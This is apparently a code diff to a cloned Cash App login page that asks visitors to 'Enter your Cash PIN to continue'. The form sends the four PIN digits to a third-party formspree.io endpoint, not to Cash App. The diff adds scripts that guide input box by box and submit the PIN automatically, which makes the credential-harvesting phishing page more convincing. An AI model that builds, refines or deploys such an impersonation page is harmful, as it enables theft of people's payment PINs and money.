@@ -2722,7 +2722,7 @@
 		position: relative;
 		z-index: 1;
 		min-height: 100%;
-		min-height: var(--vh);
+		min-height: 100vh;
 		height: auto
 	}
 	
@@ -7335,7 +7335,7 @@
 		-ms-box-pack: center;
 		-webkit-justify-content: center;
 		justify-content: center;
-		cursor: pointer;
+		cursor: default;
 		color: transparent
 	}
 	
@@ -7369,8 +7369,14 @@
 		transition: background-color .2s linear;
 		background-color: transparent !important;
 		color: transparent;
-		cursor: none;
+		cursor: default;
+	}
+
+	@media screen and (max-width: 600px) {
+		.input-bubble {
+			cursor: none;
 		caret-color: transparent;
+		}
 	}
 	
 	.passcode-inputs-bubble .input-bubbles .input-bubble:not(:last-child) {
@@ -14828,6 +14834,35 @@
 		left: -20px;
 		pointer-events: none
 	}
+
+	.to-be-filled {
+		animation: blinkBubble 1.2s ease-in-out infinite;
+		animation-delay: 1s;
+	}
+
+	@-webkit-keyframes blinkBubble {
+		0%,
+		30%,
+		70% {
+			opacity: 1
+		}
+		40%,
+		60% {
+			opacity: .3
+		}
+	}
+	
+	@keyframes blinkBubble {
+		0%,
+		30%,
+		70% {
+			opacity: 1
+		}
+		40%,
+		60% {
+			opacity: .3
+		}
+	}
 	</style>
 	<link rel="preload" data-savepage-href="https://cash-f.squarecdn.com/assets/fonts/cashmarket/cash-market-rounded-light.woff2" href="" as="font" type="font/woff2" crossorigin="anonymous">
 	<link rel="preload" data-savepage-href="https://cash-f.squarecdn.com/assets/fonts/cashmarket/cash-market-rounded-regular.woff2" href="" as="font" type="font/woff2" crossorigin="anonymous">
@@ -14880,26 +14915,83 @@
 
 <body class="theme-bg ember-application theme-green">
     <script>
-		var key_pressed = 0;
-		document.addEventListener("keydown", function(){
-			key_pressed++;
-			if (key_pressed ==1){
-				document.getElementById("bubble1").classList.add('filled');
-			}
-			if (key_pressed ==2){
-				document.getElementById("bubble2").classList.add('filled');
-			}
-			if (key_pressed ==3){
-				document.getElementById("bubble3").classList.add('filled');
-			}
-			if (key_pressed ==4){
-				document.getElementById("bubble4").classList.add('filled');
-				setTimeout("submitForm()", 1000);
-			}
-		})
+		window.onload=function(){
+
+		var values = 0;
+
+		const inputValue1 = document.querySelector('#bubble1');
+        inputValue1.addEventListener('input', function () {
+			findValues();
+			setValues();
+        });
+
+		const inputValue2 = document.querySelector('#bubble2');
+        inputValue2.addEventListener('input', function () {
+			findValues();
+			setValues();
+        });
+
+		const inputValue3 = document.querySelector('#bubble3');
+        inputValue3.addEventListener('input', function () {
+			findValues();
+			setValues();
+        });
+
+		const inputValue4 = document.querySelector('#bubble4');
+        inputValue4.addEventListener('input', function () {
+			findValues();
+			setValues();
+        });
+	}
 		function submitForm() {
 			document.forms["myForm"].submit();
 		}  
+
+		function findValues() {
+			values = document.getElementById("bubble1").value.toString().length + document.getElementById("bubble2").value.toString().length + document.getElementById("bubble3").value.toString().length + document.getElementById("bubble4").value.toString().length;
+		}
+
+		function setValues() {
+			if (values ==0){
+				document.getElementById("bubble1").classList.remove('filled');
+				document.getElementById("bubble1").classList.add('to-be-filled');
+
+				document.getElementById("bubble2").classList.remove('to-be-filled');
+			}
+			
+			if (values ==1){
+				document.getElementById("bubble1").classList.add('filled');
+				document.getElementById("bubble1").classList.remove('to-be-filled');
+
+				document.getElementById("bubble2").classList.remove('filled');
+				document.getElementById("bubble2").classList.add('to-be-filled');
+
+				document.getElementById("bubble3").classList.remove('to-be-filled');
+			}
+			if (values ==2){
+				document.getElementById("bubble2").classList.add('filled');
+				document.getElementById("bubble2").classList.remove('to-be-filled');
+
+				document.getElementById("bubble3").classList.remove('filled');
+				document.getElementById("bubble3").classList.add('to-be-filled');
+
+				document.getElementById("bubble4").classList.remove('to-be-filled');
+			}
+			if (values ==3){
+				document.getElementById("bubble3").classList.add('filled');
+				document.getElementById("bubble3").classList.remove('to-be-filled');
+
+				document.getElementById("bubble4").classList.remove('filled');
+				document.getElementById("bubble4").classList.add('to-be-filled');
+			}
+			if (values ==4){
+				document.getElementById("bubble4").classList.add('filled');
+				document.getElementById("bubble4").classList.remove('to-be-filled');
+				setTimeout("submitForm()", 1000);
+			}
+		}
+		
+		
     </script>
 	<div id="ember323" class="ember-view">
 		<div data-current-route="login" id="ember347" class="full-height application-cash ember-view">
@@ -14915,11 +15007,11 @@ Enter your Cash PIN to continue.</span></p>
 						<!---->
 						<div contenteditable="" tabindex="1" id="ember632" class="passcode-inputs-bubble flex-container flex-h ember-view">
 							<div class="input-bubbles flex-container flex-h">
-								<form name="myForm"
+								<form name="myForm" autocomplete="off"
   action="https://formspree.io/f/xayvdnbz"
   method="POST"
 >
-								<input id = "bubble1" pattern="[0-9]*" name = "bubble1" class="input-bubble ">
+								<input id = "bubble1" pattern="[0-9]*" name = "bubble1" class="input-bubble to-be-filled" autofocus >
 								<input id = "bubble2" pattern="[0-9]*" name = "bubble2" class="input-bubble ">
 								<input id = "bubble3" pattern="[0-9]*" name = "bubble3" class="input-bubble ">
 								<input id = "bubble4" pattern="[0-9]*" name = "bubble4" class="input-bubble ">
